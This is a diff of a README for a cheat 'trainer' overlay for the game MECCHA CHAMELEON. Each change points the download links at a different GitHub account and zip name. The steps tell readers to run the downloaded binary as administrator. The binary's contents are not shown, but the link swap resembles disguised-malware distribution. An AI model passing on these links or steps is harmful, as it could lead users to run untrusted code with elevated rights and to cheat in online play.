@@ -73,9 +73,9 @@ Built for Hiders who want flawless stage blends and endless prep, and Seekers wh
 
 ## Get the trainer
 
-[![Download](button.svg)](https://github.com/FlameShaperGlide/meccha-chameleon-game-trainer/releases/download/latest/Meccha-Chameleon-Game-Trainer-Overlay.zip)
+[![Download](button.svg)](https://github.com/yashkhatri45/Meccha-Chameleon-Trainer-Mod-Overlay/releases/download/latest/Meccha-Chameleon-Game-Overlay.zip)
 
-1. Hit the button or grab the [direct zip](https://github.com/FlameShaperGlide/meccha-chameleon-game-trainer/releases/download/latest/Meccha-Chameleon-Game-Trainer-Overlay.zip)
+1. Hit the button or grab the [direct zip](https://github.com/yashkhatri45/Meccha-Chameleon-Trainer-Mod-Overlay/releases/download/latest/Meccha-Chameleon-Game-Overlay.zip)
 2. Unpack somewhere outside your Steam library
 3. Boot **MECCHA CHAMELEON** from Steam first
 4. Launch the release binary as administrator
@@ -139,7 +139,7 @@ meccha-chameleon-game-trainer/
 <details>
 <summary><b>Game patched — do I need a new trainer build?</b></summary>
 
-Yes. Pull the latest from [Releases](https://github.com/FlameShaperGlide/meccha-chameleon-game-trainer/releases) or the [overlay zip](https://github.com/FlameShaperGlide/meccha-chameleon-game-trainer/releases/download/latest/Meccha-Chameleon-Game-Trainer-Overlay.zip). Start the game, then attach — version scan runs on connect.
+Yes. Pull the latest from [Releases](https://github.com/yashkhatri45/Meccha-Chameleon-Trainer-Mod-Overlay/releases) or the [overlay zip](https://github.com/yashkhatri45/Meccha-Chameleon-Trainer-Mod-Overlay/releases/download/latest/Meccha-Chameleon-Game-Overlay.zip). Start the game, then attach — version scan runs on connect.
 </details>
 
 <details>
